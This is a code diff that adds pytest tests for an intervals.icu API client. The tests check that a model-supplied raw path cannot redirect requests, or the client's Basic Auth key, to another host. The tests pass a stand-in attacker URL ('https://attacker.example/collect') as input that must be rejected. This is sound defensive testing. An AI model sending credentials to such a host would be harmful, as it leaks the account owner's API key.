@@ -215,3 +215,30 @@ class TestAthleteHelpers:
             client.get("athlete/i123/profile?x=1#frag")
 
         assert "path" in str(excinfo.value).lower()
+
+
+class TestRawPathCannotEscapeTheApi:
+    """intervals_get_raw hands the model a free-text path; it must never be able
+    to redirect the request (and this client's Basic Auth credentials) off
+    intervals.icu."""
+
+    def test_rejects_an_absolute_url(self, client):
+        with pytest.raises(IntervalsError) as excinfo:
+            client.get("https://attacker.example/collect")
+
+        assert "absolute" in str(excinfo.value).lower()
+
+    def test_never_leaks_the_api_key_to_another_host(self, client):
+        captured = {}
+
+        def handler(request):
+            captured["host"] = request.url.host
+            captured["authorization"] = request.headers.get("authorization")
+            return httpx.Response(200, json={})
+
+        client._client._transport = httpx.MockTransport(handler)
+
+        with pytest.raises(IntervalsError):
+            client.get("https://attacker.example/collect")
+
+        assert captured == {}
